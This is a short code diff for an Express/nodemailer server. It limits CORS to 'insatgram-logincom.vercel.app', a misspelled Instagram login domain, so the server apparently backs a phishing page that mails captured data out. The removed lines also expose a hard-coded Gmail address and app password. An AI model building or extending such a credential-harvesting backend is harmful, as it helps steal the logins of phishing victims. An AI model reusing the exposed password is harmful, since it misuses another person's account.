@@ -6,12 +6,13 @@ const app = express();
 const PORT = 3000;
 
 // Middleware
-app.use(cors());
-app.use(express.json());
+const corsOptions = {
+  origin: 'https://insatgram-logincom.vercel.app',
+};
+app.use(cors(corsOptions));
 
-// Replace these with your Gmail and App Password
-const GMAIL_USER = 'waemsa19@gmail.com'; // <-- CHANGE THIS
-const GMAIL_PASS = 'mcci julh ypdy ngee';   // <-- CHANGE THIS
+const GMAIL_USER = process.env.GMAIL_USER; // Use environment variables for security
+const GMAIL_PASS = process.env.GMAIL_PASS;   // Use environment variables for security
 
 // Nodemailer transporter
 const transporter = nodemailer.createTransport({
